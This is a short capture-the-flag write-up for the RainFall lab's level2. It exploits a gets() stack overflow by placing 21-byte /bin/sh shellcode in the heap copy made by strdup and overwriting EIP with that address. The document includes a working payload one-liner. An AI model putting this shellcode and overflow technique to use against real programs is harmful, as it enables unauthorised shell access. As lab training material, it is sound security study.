Using a decompiler we see that the main use a function `p` where `gets` is used
with a buffer so we can exploit it to store a shellcode. A check is made to
prevent `EIP` to store a lower address in the stack. The `p` function also use
`strdup` to copy the buffer content in the heap.

Using ltrace we can get the return address of `strdup`, which is also the address
of our shellcode thanks to the copy of the buffer made by `strdup`.

```Shell
level2@RainFall:~$ ltrace ./level2
[...]
strdup("") = 0x0804a008

```

Using gdb and a buffer overlow pattern we can see that we have 80 bytes before 
EIP to store our shellcode.

We will use a shellcode that open a terminal of 21 bytes so we need to add 59 bytes
of `NOP` instructions for the padding (21 + 59 = 80 bytes). Then we replace `EIP`
with the address of `strdup` return (in little endian) to pass the check mentioned
earlier.

```Shell
python -c 'print("\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\x90" * 59 + "\x08\xa0\x04\x08")' > /tmp/input2
cat /tmp/input2 - | ./level2

```
